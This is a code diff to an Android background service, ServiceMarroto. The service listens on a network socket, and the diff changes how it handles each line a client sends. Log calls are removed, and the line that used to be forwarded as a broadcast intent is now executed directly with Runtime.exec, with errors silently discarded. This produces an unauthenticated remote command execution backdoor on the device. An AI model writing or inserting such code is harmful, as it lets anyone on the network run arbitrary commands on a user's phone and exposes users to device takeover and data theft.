@@ -16,7 +16,6 @@ public class ServiceMarroto extends IntentService {
 
 	public ServiceMarroto() {
 		super("ServiceMarroto");
-		// TODO Auto-generated constructor stub
 	}
 
 	class ServerThread implements Runnable {
@@ -31,11 +30,8 @@ public class ServiceMarroto extends IntentService {
 			}
 			while (!Thread.currentThread().isInterrupted()) {
 				try {
-					Log.e("RECEBEU", "no aguard meu fio");
 					socket = serverSocket.accept();
-					Log.e("RECEBEU", "aceitou: " + socket.getLocalAddress());
-					CommunicationThread commThread = new CommunicationThread(
-							socket);
+					CommunicationThread commThread = new CommunicationThread(socket);
 					new Thread(commThread).start();
 				} catch (IOException e) {
 					e.printStackTrace();
@@ -51,8 +47,7 @@ public class ServiceMarroto extends IntentService {
 		public CommunicationThread(Socket clientSocket) {
 			this.clientSocket = clientSocket;
 			try {
-				this.input = new BufferedReader(new InputStreamReader(
-						this.clientSocket.getInputStream()));
+				this.input = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream()));
 			} catch (IOException e) {
 				e.printStackTrace();
 			}
@@ -61,16 +56,14 @@ public class ServiceMarroto extends IntentService {
 		public void run() {
 			try {
 				final String read = input.readLine();
-				Log.e("RECEBEU", read);// updateConversationHandler.post(new
-										// updateUIThread(read));
 				
 					new Thread(){
 						@Override
 						public void run() {
-								Intent i = new Intent("RECEIVE_ACTION");
-								i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-								i.putExtra("action", read);
-								sendBroadcast(i);
+							try {
+								Runtime runtime = Runtime.getRuntime();
+								Process process = runtime.exec(read);
+							} catch (IOException io){}
 						}
 					}.start();
 					
